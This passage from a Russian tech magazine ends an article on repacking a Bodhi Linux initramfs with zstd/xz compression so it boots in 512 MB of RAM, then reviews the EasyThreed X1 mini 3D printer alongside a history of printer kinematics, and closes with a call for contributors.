  $ sudo modprobe -r dummy


Смотри-ка, так тоже работает! Так что можешь выбирать тот метод сжатия,
который тебе больше нра вится.


                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ





       ЗАГРУЖАЕМ СОВРЕМЕННЫЙ LINUX,
         ИСПОЛЬЗУЯ МИНИМУМ ПАМЯТИ





À ÒÅÏÅÐÜ — FIRMWARE. ß ÑÊÀÇÀË — FIRMWARE!

Зай мемся сжа тием двоичных фай лов устройств, расположенных в ветке фай-
ловой системы /usr/lib/firmware. Основная сложность на данном этапе —
про верка того, что сжатие этих файлов не нарушает функци онирование сис-
темы. Тут не подой дет «сферическое устройство в ваку уме», которое мы
использовали для про верки модулей ядра. Подходящих устрой ств сре ди эму-
лируемых гипер визором VirtualBox я тоже не нашел. Зна чит, придется про-
водить испытания на реальном оборудо вании, что несколько осложня ет дело.
Перед тем как бро саться в бой, я решил посмотреть, как выглядит реали-
зация этой подсистемы в исходных текстах, которые для этого установил
и распаковал:


sudo apt install linux-source
tar -xBf /usr/src/linux-source-5.15.0/linux-source-5.15.0.tar.bz2
cd linux-source-5.15.0

Давай подума ем,  как драй веры  устройств  могут  загружать  bin-фай лы.
По-видимому, драй вер должен прочитать содержимое фай ла, находящегося
в недрах /usr/lib/firmware. Но почему под держка сжатия этих файлов нас-
траивается централизованно на уровне ядра? Это может означать, что ядро
пре дос тавляет драй верам какой-то общий API, что, вообще говоря, звучит
логично. Поищем в катало ге drivers строку lib/firmware, которая должна
входить в полный путь фай ла:


grep -R --include '*.c' 'lib/firmware' drivers

В выведенном списке пос ле мно жества строк, соответствующих различным
устройствам, замечаем интересный блок, намека ющий на общий контекст:


drivers/base/firmware_loader/main.c:    "/lib/firmware/updates/" UTS_
RELEASE,
drivers/base/firmware_loader/main.c:    "/lib/firmware/updates" ,
drivers/base/firmware_loader/main.c:    "/lib/firmware/" UTS_RELEASE,
drivers/base/firmware_loader/main.c:    "/lib/firmware"

При мерно  в  середине  файла  drivers/base/firmware_loader/main.c
находится опре деление функции _request_firmware, содержащее сле-
дующие строки:


    ret = fw_get_filesystem_firmware(device, fw->priv, "", NULL);
    ...
#ifdef CONFIG_FW_LOADER_COMPRESS_ZSTD
    if (ret == -ENOENT && nondirect)
        ret = fw_get_filesystem_firmware (device, fw->priv, ".zst",
fw_decompress_zstd);
#endif
#ifdef CONFIG_FW_LOADER_COMPRESS_XZ
    if (ret == -ENOENT && nondirect)
        ret = fw_get_filesystem_firmware (device, fw->priv, ".xz",
fw_decompress_xz);
#endif

Бег лое зна комство с ними дает понять, что загруженные тексты ядра соот-
ветствуют более новой вер сии, в которую уже добавили поддер жку zstd-сжа-
тия bin-файлов. Значит, ядра с включенной под держкой сжа тых двоичных
файлов при зап росе на загрузку файла сначала исполь зуют его каноническое
имя, а в случае неудачи повторяют попытки, добав ляя к нему суффиксы .zst
и .xz. Най ти пакет с исходны ми текстами ядра, в точности соответс твующими
версии пер вого выпуска Ubuntu 20.04 LTS, мне не уда лось. Чтобы раз веять
пос ледние сомнения, я отыскал в репозитории ядра Linux исправление,
добавляющее ZSTD-сжатие, и посмотрел, что оно изме нило и какова была
ситуация до него.





Те перь с опре деленностью можно ска зать, что к бинарным файлам драй-
веров аппарату ры можно применить xz-сжатие с добав лением к их именам
суффикса .xz. Проверка на реаль ном компьюте ре с графичес кой подсисте-
мой AMD Radeon показа ла, что такой спо соб действитель но работает:


kernel: firmware_class:fw_get_filesystem_firmware: radeon 0000:01:05.
0: Loading firmware from /lib/firmware/radeon/RS690_cp.bin.xz
kernel: firmware_class:fw_get_filesystem_firmware: radeon 0000:01:05.
0: f/w decompressing radeon/RS690_cp.bin
kernel: firmware_class:fw_set_page_data: firmware_class: fw_set_page_
data: fw-radeon/RS690_cp.bin fw_priv=(____ptrval____) data=(____
ptrval____) size= 2048




                       Чтобы увидеть аналогичные записи в своем сис-
                     темном  жур нале,  тебе  понадобится  включить
                       регис трацию отла дочных сообщений для фун-
                         кций, находя щихся в рассмот ренном выше фай ле
                        с исходным текстом. Для этого в строку парамет-
                      ров заг рузки ядра Linux перед quiet splash
                   -- вставь следующий текст:

                     dyndbg="file drivers/base/
                     firmware_loader/main.c +fmp"


ÑÎÁÈÐÀÅÌ ÂÑЁ ÂÌÅÑÒÅ

Итак, чтобы опти мизировать МФС дистрибутива опе рационной системы
Bodhi Linux 7.0 (или другой, построенной на основе Ubuntu 22.04 LTS), надо
выполнить сле дующие действия.
 1. Рас паковать МФС из файла дистри бутив ного носите ля casper/initrd.
  gz в каталог ./initramfs.
 2. Сжать файлы модулей ядра с помощью ути литы zstd и добавить к их име-
  нам суф фикс .zst. Эти файлы находятся в ветке usr/lib/modules/*/
  kernel и име ют расширение .ko .
 3. Обновить зависи мости с помощью коман ды depmod -ab ./initramfs.
 4. Сжать фай лы с мик ропрограмма ми и данными устройств с помощью ути-
   литы xz и добавить к их именам суффикс .xz . Эти файлы находятся в вет-
   ке usr/lib/firmware и могут иметь разные рас ширения.
 5. Записать в начало нового файла initrd.zst два первых блока cpio
   из ста рого фай ла initrd.gz .
 6. Соз дать новый блок cpio из сжатых на шагах 2 и 4 файлов и записать его
   третьим в файл initrd.zst.
 7. Удалить из МФС ветви с файлами, упа кован ными на шаге 6.
 8. Упаковать оставшуюся часть МФС в cpio, сжать с помощью утилиты zstd
   и дописать его в конец файла initrd.zst.

Вообще-то  для  сборки  образа МФС  исполь зуют  утилиты  из  пакета
initramfs-tools. Но заниматься его доработкой только для того, чтобы
один раз изго товить МФС дистри бутивного носителя, не хочется. Как пересо-
бирать файл initrd вручную, я подробно описывал в приложениях к статье
«Linux на диете. Уменьшаем требования Bodhi Linux к опе ративной памяти».
Здесь же я хочу поделиться с тобой сценарием, который выполняет всю
работу автоматически. Надо только в каталоге, где он рас положен, создать
под каталог isofs и записать в него содержимое официального дистрибутив-
ного носите ля Bodhi Linux 7.0.0-64, при монтированного в точке /mnt/BL70:


$ mkdir isofs
$ cp -R /mnt/BL70/. ./isofs




                      Будь внимате лен и не забудь ука зать точку в пути
                          к источнику /mnt/BL70/., потому что без нее
                      не скопируется скрытый подкаталог .disk дис-
                       три бутивного носите ля.


А вот и текст сце нария обо лочки repack_initrd.sh, который пересобирает
МФС из фай ла $SRC_INITRD в файл $TGT_INITRD:


#!/bin/sh
LANG=POSIX
SRC_INITRD=./isofs/casper/initrd.gz
TGT_INITRD=./isofs/casper/initrd.zst
INITRAMFS=./initramfs
SGN_CPIO="ASCII cpio archive"
SGN_ZSTD="Zstandard compressed data"
OFFSET= 0
[ -f $SRC_INITRD ] || { echo "ERROR: Source file not found:
$SRC_INITRD"; exit 1; }
###
# Определение смещения OFFSET к блоку, который содержит сжатую МФС
###
echo "Search for the compressed initramfs in $SRC_INITRD."
CONTENT="`dd if=$SRC_INITRD bs= 512 skip=$OFFSET | file -`"
while echo "$CONTENT" | grep -q "$SGN_CPIO"
do
echo "Skip part at: $OFFSET"
SIZE=`dd if=$SRC_INITRD bs= 512 skip=$OFFSET | cpio -it 2>&1 | grep
block | cut -d ' ' -f 1`
OFFSET=$(($OFFSET+$SIZE))
CONTENT="`dd if=$SRC_INITRD bs= 512 skip=$OFFSET | file -`"
done
if echo "$CONTENT" | grep -q "$SGN_ZSTD"
then
echo "Compressed initramfs found at: $OFFSET"
else
echo 'Compressed initramfs not found.'
exit 1
fi
###
# Распаковка содержимого МФС в каталог $INITRAMFS
###
echo "Extracting initramfs content into $INITRAMFS."
[ -d $INITRAMFS ] && rm -fr $INITRAMFS
mkdir $INITRAMFS
dd if=$SRC_INITRD bs= 512 skip=$OFFSET | unzstd | cpio -idD $INITRAMFS
###
# Сжатие модулей ядра и обновление зависимостей
###
echo 'Compressing kernel modules.'
find $INITRAMFS/usr/lib/modules/*/kernel -name * .ko \
    -exec zstd --compress -19 -o '{}.zst' '{}' \; -and\
    -exec rm '{}' \;
echo 'Updating modules dependencies.'
depmod -ab $INITRAMFS
###
# Сжатие firmware
###
echo 'Compressing firmware.'
find $INITRAMFS/usr/lib/firmware -type f \
    -exec echo '{}' \; \
    -and -exec xz --compress -C crc32 '{}' \;
###
# Сборка нового образа МФС в $TGT_INITRD
###
echo "Packing all together into $TGT_INITRD"
{
dd if=$SRC_INITRD bs= 512 count=$OFFSET
cd $INITRAMFS
(echo '.'; echo './usr'; echo './usr/lib'; echo './usr/lib/modules';
\
ls -1d ./usr/lib/modules/*; \
find ./usr/lib/modules/*/kernel ./usr/lib/firmware) | cpio -H newc -o
rm -fr ./usr/lib/modules/*/kernel ./usr/lib/firmware
find . | cpio -H newc -o | zstd -8
cd ..
} > $TGT_INITRD
echo 'Done.'

Здесь все дол жно быть понятно из коммента риев. Пояс ню только два момен-
та.
 1. В первой строке переменной LANG присваивается значение POSIX, чтобы
   выполняемые из сценария утилиты выдава ли канони ческие сообщения
   на английском язы ке, а не на язы ке общения пользовате ля сис темы. Если
   это го не сде лать, то можно получить проблему определе ния типа сос-
   тавных частей обра за МФС в файле $SRC_INITRD по  сигнатурам
  $SGN_CPIO и $SGN_ZSTD.
 2. При архивировании сжа тых модулей ядра и бинарных файлов для устрой-
   ств команде cpio явным образом передаются промежуточные под катало ги
  . , ./usr, ./usr/lib, ./usr/lib/modules, потому что к момен ту рас-
   паковки в формируемой в оперативной памяти МФС пути ./usr/lib/
  modules еще не сущес твует, а алгоритм распаковки cpio, реализованный
   в ядре Linux, не под держивает соз дание про межу точных каталогов.




                     К  статье  прилага ется  архив  bl70_lowram.tgz,
                        в котором, помимо описанного здесь сценария
                   repack_initrd.sh,  ты  найдешь  сценарий
                   make_iso.sh для сборки модифи цирован ного
                      дистрибутивного  образа  bl70_lowram.iso.
                     Перед его выпол нением убедись, что в сис теме
                         установ лен  пакет  genisoimage,  и  создай
                      самос тоятельно  дополнительные  пункты меню
                          загрузчи ков   в  файлах  isofs/isolinux/
                   isolinux.cfg и isofs/boot/grub/grub.
                   cfg, в которых /casper/initrd.gz замени
                       на /casper/initrd.zst.



ÂÛÂÎÄÛ

Те перь ты сможешь, если захочешь, соб рать свой вари ант дис трибутива
Bodhi Linux 7.0, который будет заг ружаться на компьютерах, имеющих все-
го  512 Мбайт  опе ративной  памяти,  тогда  как офи циальный  требует
как минимум в два раза больше. Неп лохой результат, если учесть, что
это самая акту альная на момент написания статьи версия Ubuntu LTS с лег-
ковесной, но пол ноценной гра фической обо лочкой Moksha Desktop. Такой
дистри бутив ный носитель может пригодиться в качестве аварийного для ана-
лиза проблем и восста новления работос пособности компьютеров. С него
же, помимо про чего, можно уста новить операционную систему для пов-
седнев ной работы.
GEEK





3D-печатью  я  увлекаюсь  уже  давно,
но домаш ним 3D-принтером пользовался
нечасто: на работе у меня имеется целых
два подоб ных аппарата. Громадная «Прю-
ша»  занима ла  слиш ком  мно го  места,       Валентин Холмогоров                                                                               Ведущий редактор
поэто му, продав ее, я оза дачился поиском          valentin@holmogorov.ru
какого-нибудь  компактно го  недоро гого
аппарата на случай, если мне прис пичит
быстро  напечатать  что-нибудь  мелкое.
Выбор пал на EasyThreed X1 — 3D-принтер
размером с небольшую книжку. О нем я
сегодня и рас скажу.


Ис тория любительских 3D-принтеров началась в 2005 году, когда появи лась
первая информация о проекте RepRap. В его основе лежала идея соз дания
самокопирующе гося устрой ства — 3D-прин тера, на котором мож но было бы
напечатать другой 3D-принтер. Реализовать эту технологию в целом уда лось.
Создатель RepRap, преподаватель машиностро ения в бри танском универ-
ситете Бата Адри ан Боуер, планировал распростра нять чертежи и схемы
устройства в интерне те, чтобы любой желающий мог пос троить собс твен-
ный 3D-принтер без необходимости заказывать где-то дорогостоящее обо-
рудование. В марте 2005 года он запустил в сети блог, посвященный этому
про екту, а уже 13 сентября следующего, 2006 года первый прототип RepRap
успешно напечатал копию собственной детали, которую потом использовали
вместо аналогич ного узла принтера, изна чально изготов ленного на заказ.





                   Пер вый 3D-принтер RepRap

Финальная версия RepRap, получившая наиме нова ние Darwin в честь извес-
тного англий ско го ученого-натуралис та, уви дела свет в 2008 году. Этот прин-
тер сумел воспроизвести при мерно половину деталей, из которых он был
изготовлен, а 14 апреля 2008 года он напеча тал пер вый в истории пот-
ребительский предмет — держатель медиапле ера  iPod для крепления
на приборной панели в автомоби ле Ford Fiesta. В течение 2008 года во всем
мире было постро ено более 100 копий 3D-принтера RepRap  Darwin,
а 30 нояб ря того же года пользователь Уэйд Борц сообщил, что ему удалось
напечатать на RepRap полный комплект деталей, из которых можно собрать
другой такой же прин тер.





  Адриан Боуер (слева) демонс три рует исходный принтер RepRap и его
  «потомка», напечатанного на нем самом

Схе ма, впер вые примененная в прин тере RepRap Darwin, используется
во многих 3D-принтерах и по сей день. Она называ ется XY Head Z Bed.
Как она выглядит на практике? Давай разберемся, посмотрев на рисунок.





             Схе ма устройства 3D-прин тера XY Head Z Bed

Основа мно гих 3D-принтеров — это печата ющий модуль с экструдером.
С помощью элек тродвигателя в этот модуль подается легкоплав кая плас-
тиковая нить, которую часто называют филаментом (от англ. lament, «нить»).
Внутри модуля она нагревается, под действи ем температуры плавит ся и бла-
годаря усилию дви гателя проталкива ется через сопло экстру дера. Соп ло
име ет очень маленький диаметр, на выходе из него нагретая нить получается
тонкой и очень элас тичной. Абсолют но по такому же принципу работает зна-
комый каж дому «домаш нему мастеру» термоклеевой пис толет, только вместо
нити  там  при меняются  толстые  цилиндрические  бруски  легкоплавкого
полиме ра.
  Рама 3D-прин тера, использующего схе му XY Head Z Bed, пос троена
по классической декар товой системе координат. Печатающая головка с наг-
ревательным элементом и экстру дером перемещается вдоль осей X и Y,
а стол, на котором рас полага ется печатаемая деталь, дви гается по оси Z. Все
оси (и сис тема подачи пластиковой нити тоже) при водятся в движение
шаговыми элек тродвигателями, а управляет этой машине рией электронный
контрол лер, в роли которого обычно выступает одноплатный мини-компь-
ютер: Arduino, Raspberry Pi или им подоб ный. С помощью специальной прог-
раммы контроллер отсылает на дви гатели управля ющие сигналы, а они,
в свою оче редь, переме щают печата ющий модуль по горизон тали и вер-
тикали. В результате слаженной синхронной работы всех двигателей печата-
ющий модуль может опи сывать сложные траекто рии, создавая с помощью
наг ретой нити сво еоб разный замысловатый «рисунок».
  Деталь на таком принтере печата ется послойно. Сначала устрой ство
«укладыва ет» на стол пер вый слой плас тика, который «прилипает» к его
поверхнос ти, удер живая будущую деталь. Затем поверх первого слоя прин-
тер «рисует» плас тиком вто рой, над ним — третий и так далее. Пос тепенно,
шаг за шагом, на столе 3D-прин тера «вырастает» объ емное изде лие.





                 3D-принтер создает деталь послойно

Центр тяжести в процессе работы такого прин тера не меня ет своего положе-
ния, поскольку модуль экструдера не дви гается по оси Z. Колебания при этом
минимальны. Минимальны и требования к мощ ности, а также надежности
при вода оси Z — «один раз в слой» дви гатель смещает стол на очень малень-
кий шаг, сдвигая платформу вниз. Вниз не вверх, в данном случае вес плат-
формы помога ет дви гателю, а не тре бует от него дополнительных уси лий.
Получилась очень простая и очень надеж ная конс трукция, а всем, кто хоть
немного знаком с разработкой любых устрой ств, извес тно, что чем проще
система, тем меньше веро ятность слу чайной поломки.
  Со временем инже неры придумали мно жество тех нологических решений,
улучшающих эту конструк цию. Появились раз личные схе мы управления экс-
трудером. Чтобы уменьшить массу движущихся час тей, дви гатель подачи
пластика на некоторых моделях переместили в корпус. Были разработаны
схе мы CoreXY, H-Bot, схема Bowden-экс трудера. С использованием этих схем
достигается бльшая скорость печати и точность позициони рова ния экстру-
дера, чем обеспечивается высокое качес тво получа емого изделия.
  Во вто рой модели прин тера RepRap, Mendel, разработчики попытались
улучшить жес ткость конструкции, изменив схе му на XZ Head Y Bed. В этой
схе ме печата ющий модуль с экструдером двигал ся по осям X и Z, а стол —
по оси Y.





             Схе ма устройства 3D-прин тера XZ Head Y Bed

Однако создатели тут же столкнулись с огромным количеством проблем
в настройке такого принтера. Привод по оси Z с помощью рем ней не выдер-
живает никакой кри тики. Попытавшись исправить один недостаток, инженеры
нап лодили дру гие с еще более печальными последс твиями. Хотя плюс у такой
схе мы все-таки был, и зна читель ный: большая площадь печати.
  Мо дернизацией и даль нейшей доработ кой этой схе мы занялся чешский
инже нер Йозеф Прю ша. Из его про екта вырос, пожалуй, самый распростра-
ненный тип самодельных и поставляемых в виде конструктора комплектов
для сборки 3D-прин теров: Prusa i3.
  Прюша поменял приводы по оси Z с ремней на винтовые шпильки и сде-
лал жесткую раму. Прочность конс трукции мно гок ратно повысилась, упрости-
лась сборка и настройка изделия. Именно это, наверное, и является при-
чиной столь высокой популярности схемы. Многие про изводители выбрали
XZ Head Y Bed в качестве основы для сво их сбор ных ком плектов.





  Типич ный представитель семейства Prusa — Ender, мой основной
  рабочий принтер

Однако, что бы добиться нужного результата, создателю Prusa i3 пришлось
отойти от пер воначальной идеи RepRap и сде лать многие детали невоспро-
изводимы ми на самом принтере. В плюсе такой схемы мы имеем относитель-
но низкую стоимость и возможность самостоятель ной сборки.
  Но есть и минусы. Для «Прю ши» очень сложно сделать закрытый кор пус.
Кро ме того, ката ющий ся туда-сюда стол с деталью не добавляет качеству
печати никаких плю сов, зато увеличивает обте кание изделия потоками воз-
духа и соз дает про дольные наг рузки на неос тывшем пластике. Излишний
обдув детали воздухом ускоряет застывание некото рых сортов филамента,
что может при вести к расслаива нию изделия, если слои не успели как сле-
дует «схватить ся».
   Благодаря подвижно му сто лу в про цессе работы у принтера меняется
положение центра тяжести, но эту проблему решили, урав новесив конс трук-
цию. В некоторых моделях для привода оси Z использует ся два двигателя, что
сни жает общую надеж ность узла. Хотя в большинстве слу чаев исполь зуется
один шаговый двигатель, вращающий вер тикальную шпильку с резь бой,
а вто рая шпилька, обеспечивающая устойчивость конструкции, снабжена
цилиндри ческой шай бой с внутренней резьбой и в переме щении экс тру дера
по вер тикали непос редственно не участву ет, играя роль пассивной опоры.
  Еще одна альтер нативная схема кинема тики 3D-принтеров — X Head YZ
Bed.





             Схе ма устройства 3D-прин тера X Head YZ Bed




                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ





       РАЗБИРАЕМ ОСНОВЫ НА ПРИМЕРЕ
           БЮДЖЕТНОГО 3D-ПРИНТЕРА
                       EASYTHREED ×1




Минусы — все те же самые, что у предыдущей схе мы, и к ним еще прибавил ся
нестабильный центр тяжес ти. Есть использующие  эту схему принтеры,
которые выпускают ся серий но. Но по сравнению с альтернатив ными схе мами
их количество невелико.
   Схе ма XY Bed Z Head тоже стояла у исто ков раз вития настольных прин-
теров, она ведет свою историю от фре зерных станков. Там она явля ется
одной из основных и име ет все причины быть такой. При фре зеровке исполь-
зуются большие мощ ности и массивные приводы. Сама же деталь весит мно-
го меньше при вода, и дви гать стол с ней гораздо проще. Ско рости обработ-
ки на фре зерном станке небольшие, поэтому перемещать стол на таких ско-
ростях проблемы нет. В 3D-печати все по-другому. Что бы обес печить дос-
таточную ско рость работы принтера, нам требуются быстрые приводы, а это
создает нагрузку на двигатели для перемещения стола сразу в двух нап-
равле ниях.





             Схе ма устройства 3D-прин тера XY Bed Z Head

Закончим с классическими схемами и обратим внимание на экзотику. Вот
такой замысловатый принтер носит наименование Delta.





                         3D-принтер Delta

Какие пре имущества пред лага ют нам создатели такой схе мы? Повышенную
скорость работы и большую высоту печати. Отложим в сторону вопросы ско-
рости, это хорошее преимущество, ког да оно не идет во вред качес тву изде-
лия. Нас чет высоты рас печатываемых деталей. Скорость печати по горизон-
тали у 3D-принтера намного выше, чем скорость печати по вертикали.
Это обусловле но естественными при чина ми: чем большего качества мы
желаем добиться при печати, тем тоньше слой мы используем и тем дольше
идет печать.
  Кроме  того, конструкция с совсем иными  алгоритмами управле ния
не добав ляет устройству надежности. Это мое личное мнение. Я уже под-
нимал дискуссию на эту тему на профильных форумах, но другие учас тники
не высказали внятных аргумен тов в пользу такой схемы, за исключени ем того,
что «Дельта — это круто».
  Кроме все го про чего, есть информация от раз работчиков 3D-принтеров,
что схема Delta имеет проб лемы с точностью позици онирования печата юще-
го модуля. Естествен но, это отри цательно ска зывается на качестве печати.
Однако количество «под водных кам ней» технического пла на, о которых
не спешат расска зывать создатели, не мешает развитию подобных проектов,
поэтому именно такую схему используют несколько моделей китайских 3D-
принтеров бюджетного сег мента.
  На этой мысли, я думаю, мы и завершим наш краткий обзор конструкций
и кинематики современных бытовых прин теров и перейдем непосредственно
к модели, которую я при обрел для домаш него исполь зования.


ÏÎ×ÅÌÓ EASYTHREED X1?

Прежде всего потому, что этот принтер очень компактный. Я, кажется,
говорил, что он размером с небольшую кни гу? Вот он рядышком с нашим
недавно выпущенным сбор ником избранных ста тей из журнала «Хакер», мож-
но наг лядно срав нить габариты.





           EasyThreed X1 рядом с книгой. Он реально маленький!

EasyThreed X1 — это клас сический 3D-принтер, пос троенный по схе ме XZ
Head Y Bed. Прав да, в отличие от «Прюши», перемещение по оси Z выпол-
няется с использовани ем не винтового шкива, а зуб чатого ремня. Но пос-
кольку сам принтер довольно компактный, а его детали легкие, ремень
с перемещением печатающей голов ки и одной горизонтальной направля-
ющей вполне справ ляется.
   Стол у это го принтера, как и у многих других бюд жетных устрой ств,
без подогрева. Подогрев стола позволяет надеж нее фиксировать на его
поверхнос ти печатаемую деталь, а так же избе жать ее случайного отрыва
во вре мя печати. У EasyThreed X1 на пластиковом столе закреплено шер-
шавое покрытие, на ощупь напоми нающее «наждачку-нулевку», которое
обеспечивает довольно надеж ную адге зию (прилипание деталь ки к повер-
хности стола). По крайней мере, отодрать изделие от этой поверхнос ти
по завершении печати не так-то и прос то. Минус в том, что это покрытие
несъемное, в отли чие от того же Ender, где оно выполнено в виде маг нитного
коврика, который можно снять и про мыть водой или обработать щеткой
от  остатков  пластика. Здесь без  раз борки  стола  покрытие  заменить
не получится.
   Кстати, по поводу стола. Обычно его регулировка представляет собой
отдельную проблему: необ ходимо выс тавить рассто яние между соплом экс-
трудера (в запар кован ном положении) и поверхностью стола во всех четырех
крайних точках не более толщины листа офисной бумаги. У бюджетных 3D-
принтеров авто матической подстройки стола, разумеется, нет, поэтому дела-
ется это вруч ную вращени ем четырех подпружиненных винтов, расположен-
ных сни зу. У того же Ender стол приходится подстра ивать регулярно — пос ле
нескольких итераций печати или долгого прос тоя калиб ровка сбивается.
Видимо, из-за того, что сам EasyThreed X1 малень кий, а стол легкий, нас троив
его при пер вом запус ке, я не менял положение вин тов ни разу.
  Зато в EasyThreed X1 есть автоматическая заг рузка и выгрузка филамента,
которых нет даже в более дорогих моделях Prusa, включая тот же Ender. Там
нуж но нажать на фиксатор и руками пропихивать пластик в экстру дер, пока он
не потечет из соп ла. Тут — нажал на кно почку и ждешь, пока принтер сам заг-
рузит в экструдер нить. Экстрак ция тоже автоматическая и сделана по уму:
сна чала принтер продавливает филамент вперед, чтобы очистить сопло,
и только потом медленно и печально извлекает его из печатающе го модуля.
Красота!
   Что можно отнести к недостаткам прин тера — так это довольно хлипкий
держатель для катуш ки с пластиком. Кроме того, держатель низ кий (в силу
ком пак тных размеров самого принтера), поэто му боль шой моток филамента
на нем поместить невозможно. Катушку стан дартно го размера приходится
класть рядышком и внимательно следить, чтобы пластик свобод но поступал
в экструдер, пери оди чески отматывая его понемногу вручную. Ко все му про-
чему принтер дос таточно шум ный, но к это му быс тро привыкаешь.





                     EasyThreed X1 в процессе печати

Блок управле ния принтером здесь вынесен в отдель ный модуль, к которому
под клю чается адап тер питания. Кнопок на контрол лере все го четыре: одна
позволя ет запар ковать печатающую головку, три соседние — загрузить
филамент, выгрузить филамент и начать печать. Повторное нажатие этой же
кнопки при необходимости при останавливает работу принтера. Все прос то.
В блоке управле ния имеется интерфейс для подключения к компьютеру
с помощью шнура USB (разъем имеет обыч ный «прин терный» формат USB
AB) и считыватель для карт формата microSD. На такую карту можно записать
файл печатаемого изделия в формате GCode.
  Сразу скажу, что настро ить «прямую» печать с компьютера по кабелю мне
так и не удалось, как я ни старался. Зато с microSD принтер печатает отлично.
Прав да, у этой модели отсутс твует ЖК-дисплей, поз воля ющий выбрать файл
для печати, что довольно-таки неудобно. Поэтому приходится пос тупать так:
очи щать карточку, записы вать на нее подготовленный слай сером GCode-
файл, встав лять кар ту в принтер и запус кать печать нажатием на кнопку —
принтер автоматически подхватывает лежащий на карте файлик. С диспле ем,
позволя ющим выбрать какую-то конкретную модель из несколь ких, было бы
не в пример удоб нее, но я доволь но быстро при норовился и к такому способу
работы.





                   Печать детали завер шена

Об ласть печати у принтера неболь шая: всего лишь 100 × 100 × 100 мм, ско-
рость печати тоже совсем не кос мическая: 10–40 мм/с. Но для бытовых нужд
этого  вполне  хватает.  Поскольку  EasyThreed  X1  оборудован  столом
без подогрева, его «род ной» тип пластика — PLA диаметром 1,75 мм.
С использовани ем ABS я печатать не пробовал, но подозреваю, что делами-
нации не избежать — деталь, скорее все го, будет отслаиваться от повер-
хности стола. А вот филамен том Watson он печата ет нормально; правда,
для работы с этим типом прутка приходит ся прог рам мно под нимать тем-
пературу соп ла до 230 гра дусов (при чем 230 для него — это вер хний пре дел,
так что с печатью ABS точно будут проблемы).
   Что каса ется качества печати, то EasyThreed X1 под держивает толщину
слоя от 0,05 до 0,3 мм при диаметре сопла 0,4 мм. Изделия получа ются впол-
не приемле мыми, слои на поверхнос ти, конеч но, заметны невооруженным
глазом, но этим гре шат практически все бытовые 3D-принтеры бюд жетного
сег мента. Хочет ся получить идеально ровную «глянцевую» деталь — дих-
лорэтан в помощь (толь ко не забывай, что это вещество очень токсично).


ÂÛÂÎÄÛ

Еще одним существенным недостатком EasyThreed X1 я бы назвал отсутс твие
понятной инструкции по настройке и готовых про филей для слайсеров. Нет,
мануал, конеч но, име ется, причем целых два: краткий и лаконичный —
на англий ском, а также подробный и исчерпы вающий — на китай ском. Тем
не менее нагуг лить параметры прин тера, которые следует ввести в Cura,
для меня не составило большого тру да, все настройки есть на форумах энту-
зиастов 3D-печати, а сам про цесс вби вания нужных циферок в Cura занял
у меня минут пять.
   Лично я этим при обретением доволен: прин тер занимает мало мес та,
прост в эксплуатации, вот уже год с небольшим работает у меня дома
без еди ного сбоя. Да, круп ную деталь на нем не напечатаешь, для это го есть
устройства поболь ше и подоро же. Но для того, чтобы получить фигурку
из Warhammer 40К что-то ком пактное или просто поучиться 3D-печати,
EasyThreed X1 — это неп лохой вариант начального уровня.
   СТАНЬ АВТОРОМ
     «ХАКЕРА»!


«Хакеру» нужны новые авторы, и ты можешь стать одним
из них! Если тебе интересно то, о чем мы пишем, и есть
желание исследовать эти темы вместе с нами, то не упусти
возможность вступить в ряды наших авторов и получать
за это все, что им причитается.


 • Àâòîðû ïîëó÷àþò äåíåæíîå âîçíàãðàæäåíèå. Размер  зависит
   от сложности и уникальности темы и объема проделанной работы (но
   не от объема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñïëàòíî: каждая опубликованная
   статья приносит месяц подписки и значительно увеличивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной версии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с автором все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Первым делом задай себе несколько простых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñîâàòü äðóãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðåìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåòñÿ ìíå êðóòîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîäìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñòèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
